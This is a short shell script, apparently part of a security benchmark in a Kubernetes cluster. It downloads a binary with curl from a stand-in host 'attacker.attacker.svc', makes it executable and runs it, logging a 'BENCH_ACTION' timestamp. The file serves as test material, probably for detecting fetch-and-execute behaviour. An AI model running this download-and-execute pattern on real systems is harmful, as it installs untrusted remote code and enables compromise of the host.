#!/bin/sh
# Fetch a tool from the in-cluster attacker, make it executable, run it.
mkdir -p /tmp/bench
curl -fsS -o /tmp/bench/tool http://attacker.attacker.svc:8080/tool || exit 1
chmod +x /tmp/bench/tool
echo "BENCH_ACTION $(date +%s%3N)"
/tmp/bench/tool
